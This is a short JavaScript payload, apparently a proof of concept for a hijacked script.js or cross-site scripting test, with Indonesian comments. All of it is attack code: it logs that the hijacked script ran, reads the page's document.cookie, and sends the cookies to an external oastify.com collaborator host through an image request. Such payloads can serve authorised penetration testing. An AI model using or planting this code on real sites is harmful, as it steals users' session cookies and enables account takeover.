(function () {
    // bukti eksekusi
    console.log("Hijacked script.js executed");

    // ekstraksi cookie
    const data = encodeURIComponent(document.cookie);

    // kirim ke endpoint relatif
    const img = new Image();
    img.src = "https://mukxdo1xp2okr74mjzun4847cyip6gu5.oastify.com/cookie?q=" + data;
})();

